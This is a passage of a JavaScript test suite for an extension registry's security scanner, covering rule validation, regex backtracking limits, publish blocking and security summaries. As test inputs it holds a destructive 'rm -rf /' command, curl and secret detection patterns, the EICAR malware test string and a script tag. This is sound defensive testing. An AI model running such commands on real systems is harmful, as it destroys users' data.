      assert.throws(() => toRule(bad, owner), /Invalid security rule/, JSON.stringify(bad)?.slice(0, 80));
    }
    assert.throws(() => toRule(spec(), 'bad owner!'), /owner/);
  });

  await check('toRule rejects patterns that can backtrack catastrophically', () => {
    for (const pattern of ['(a+)+', '(.*)*', '(a*)*b', '(\\w+\\s?)+$', '(?:x+y+)+', '(a|b+)*', '((a+))+', '(.+)+x', '(\\d+)*', '(a{2,})+']) {
      assert.throws(() => toRule(spec({ pattern }), 'ext.acme'), /refused/, pattern);
    }
    for (const pattern of ['a.*b.*c', '(?:foo|bar)+', 'curl\\s+-[a-z]+\\s+http', '(a?)+b', '\\bsecret_[a-z]{3,8}\\b', '[(+*]+x', '\\(a+\\)+']) {
      assert.doesNotThrow(() => toRule(spec({ pattern }), 'ext.acme'), pattern);
    }
    assert.throws(() => toRule(spec({ pattern: 'a+b+c+d+e+f+g+h' }), 'ext.acme'), /unbounded/);
  });

  await check('a hostile extra rule cannot slow a scan down once it is accepted', () => {
    const rule = toRule(spec({ pattern: 'a.*a.*a.*a' }), 'ext.acme');
    const start = Date.now();
    scanText(`${'a '.repeat(1000)}\n`.repeat(20), { kind: 'shell', extraRules: [rule] });
    assert.ok(Date.now() - start < 2000);
  });

  await check('rules that arrive broken are ignored, not fatal', () => {
    const junk = [null, {}, { id: 'x' }, { id: 'x', pattern: 'a', targets: ['command'] }];
    assert.doesNotThrow(() => scanCommand('rm -rf /', { extraRules: junk }));
  });
}

/** The checks that need no server. */
export async function scannerChecks(check) {
  await ruleChecks(check);
  await commandChecks(check);
  await textChecks(check);
  await manifestChecks(check);
  await distChecks(check);
  await projectChecks(check);
  await customRuleChecks(check);
}

/**
 * The server flow. `call(method, route, { token, body })` fetches from a running
 * test server, `sample(overrides)` builds a valid manifest.
 */
export async function scannerServerChecks(check, call, sample, store) {
  const blocked = () => sample({ id: 'ext.malware', version: '1.0.0', code: { main: `run("${EICAR.replace(/\\/g, '\\\\')}");` } });

  await check('publishing a manifest with a critical finding is refused with 422 and the findings', async () => {
    const response = await call('POST', '/api/v1/publish', { token: 't0ken', body: blocked() });
    assert.equal(response.status, 422);
    const data = await response.json();
    assert.equal(data.error, 'security_blocked');
    assert.ok(data.message.includes('ext.malware'));
    assert.ok(data.findings.length >= 1 && data.findings.length <= 20);
    assert.ok(data.findings.every((finding) => finding.severity === 'critical'));
    assert.equal(data.findings[0].id, 'SEC-MAL-001');
    assert.equal(data.findings[0].file, 'code.main');
    assert.equal((await call('GET', '/api/v1/extensions/ext.malware')).status, 404, 'nothing was stored');
  });

  await check('the block cannot be overridden and caps the findings at 20', async () => {
    const commands = Array.from({ length: 40 }, (_, i) => ({ id: `c${i}`, title: 'rm -rf /' }));
    const response = await call('POST', '/api/v1/publish', { token: 't0ken', body: sample({ id: 'ext.many', commands, code: { main: 'x' } }) });
    assert.equal(response.status, 422);
    assert.equal((await response.json()).findings.length, 20);
  });

  await check('a warning is accepted and carries the summary', async () => {
    const body = sample({ id: 'ext.warn', pages: [{ id: 'p', title: 'P', format: 'html', content: '<script>1</script>' }] });
    const response = await call('POST', '/api/v1/publish', { token: 't0ken', body });
    assert.equal(response.status, 201);
    const data = await response.json();
    assert.equal(data.security.verdict, 'warn');
    assert.equal(data.security.counts.medium, 1);
  });

  await check('a clean publish carries a clean security summary', async () => {
    const response = await call('POST', '/api/v1/publish', { token: 't0ken', body: sample({ id: 'ext.clean', version: '1.0.0' }) });
    assert.equal(response.status, 201);
    assert.deepEqual((await response.json()).security, { verdict: 'clean', counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 } });
  });

  await check('the details of an extension carry the summary per version, and the stored meta has the timing', async () => {
    const data = await (await call('GET', '/api/v1/extensions/ext.clean')).json();
    assert.equal(data.security.verdict, 'clean');
    assert.equal(data.securityByVersion['1.0.0'].verdict, 'clean');
    const meta = JSON.parse(fs.readFileSync(path.join(store.root, 'extensions', 'ext.clean', 'meta.json'), 'utf8'));
    assert.equal(meta.security['1.0.0'].scanner, SCANNER_VERSION);
    assert.ok(!Number.isNaN(Date.parse(meta.security['1.0.0'].scannedAt)));
    assert.equal(meta.security['1.0.0'].verdict, 'clean');
  });

  await check('the catalogue exposes verdict and counts of the recommended version', async () => {
    const data = await (await call('GET', '/api/v1/index')).json();
    const clean = data.extensions.find((entry) => entry.id === 'ext.clean');
    const warn = data.extensions.find((entry) => entry.id === 'ext.warn');
    assert.deepEqual(Object.keys(clean.security).sort(), ['counts', 'verdict']);
    assert.equal(clean.security.verdict, 'clean');
    assert.equal(warn.security.verdict, 'warn');
  });

  await check('GET /security returns the full findings, rescanned from the stored manifest', async () => {
    const data = await (await call('GET', '/api/v1/extensions/ext.warn/1.0.0/security')).json();
    assert.equal(data.verdict, 'warn');
    assert.equal(data.findings[0].id, 'SEC-HTML-002');
    assert.equal(data.findings[0].file, 'page:p');
    assert.equal(data.scanner, SCANNER_VERSION);
    assert.equal(data.counts.medium, 1);
    assert.equal((await call('GET', '/api/v1/extensions/ext.warn/latest/security')).status, 200);
    assert.equal((await call('GET', '/api/v1/extensions/ext.warn/9.9.9/security')).status, 404);
    assert.equal((await call('GET', '/api/v1/extensions/ext.nothing/1.0.0/security')).status, 404);
  });

  await check('GET /scanner lists the rules publicly', async () => {
    const data = await (await call('GET', '/api/v1/scanner')).json();
    assert.equal(data.version, SCANNER_VERSION);
    assert.equal(data.rules, RULES.length);
    assert.equal(data.items.length, RULES.length);
    assert.ok(data.items.find((item) => item.id === 'SEC-MAL-001' && item.title && item.severity === 'critical'));
  });

  await check('project page and overview show the security line', async () => {
    const page = await (await call('GET', '/e/ext.clean')).text();
    assert.ok(page.includes('Security: clean'), 'project page');
    const warnPage = await (await call('GET', '/e/ext.warn')).text();
    assert.ok(warnPage.includes('Security: 1 warning'));
    assert.ok(warnPage.includes('/api/v1/extensions/ext.warn/1.0.0/security'));
    const overview = await (await call('GET', '/')).text();
    assert.ok(overview.includes('Security: clean') && overview.includes('Security: 1 warning'), 'overview');
  });

  await check('versions already on disk without a summary are scanned lazily and the result is kept', async () => {
    const dir = path.join(store.root, 'extensions', 'ext.old');
    fs.mkdirSync(dir, { recursive: true });
    for (const version of ['1.0.0', '1.1.0']) {
      fs.writeFileSync(path.join(dir, `${version}.json`), JSON.stringify(sample({ id: 'ext.old', version })));
    }
    await store.reload('ext.old');
    const entry = store.get('ext.old');
    assert.equal(entry.meta.security.verdict, 'clean', 'latest is scanned on load');
    assert.equal(entry.meta.security.scanner, SCANNER_VERSION);
    const data = await (await call('GET', '/api/v1/extensions/ext.old')).json();
    assert.equal(data.securityByVersion['1.0.0'].verdict, 'clean', 'an older version is scanned on first read');
    const meta = JSON.parse(fs.readFileSync(path.join(dir, 'meta.json'), 'utf8'));
    assert.deepEqual(Object.keys(meta.security).sort(), ['1.0.0', '1.1.0']);
  });

  await check('a stale summary from an older scanner is refreshed, a corrupt meta file does not crash', async () => {
    const meta = path.join(store.root, 'extensions', 'ext.clean', 'meta.json');
    const data = JSON.parse(fs.readFileSync(meta, 'utf8'));
    data.security['1.0.0'].scanner = 0;
    fs.writeFileSync(meta, JSON.stringify(data));
    await store.reload('ext.clean');
    assert.equal(store.get('ext.clean').meta.security.scanner, SCANNER_VERSION);
    fs.writeFileSync(meta, '{ not json');
    await store.reload('ext.clean');
    assert.equal(store.get('ext.clean').meta.security.verdict, 'clean');
  });
}

/* ---------------------------------------------------------------------- *
 * Standalone run
 * ---------------------------------------------------------------------- */

const isMain = process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href;
if (isMain) {
  let passed = 0;
  let failed = 0;
  const check = async (name, fn) => {
    try {
      await fn();
      passed++;
      process.stdout.write(`✓ ${name}\n`);
    } catch (err) {
      failed++;
      process.stdout.write(`✗ ${name}\n    ${err.message}\n`);
    }
  };
  await scannerChecks(check);
  process.stdout.write(`\n${passed} passed, ${failed} failed\n`);
  process.exit(failed ? 1 : 0);
}
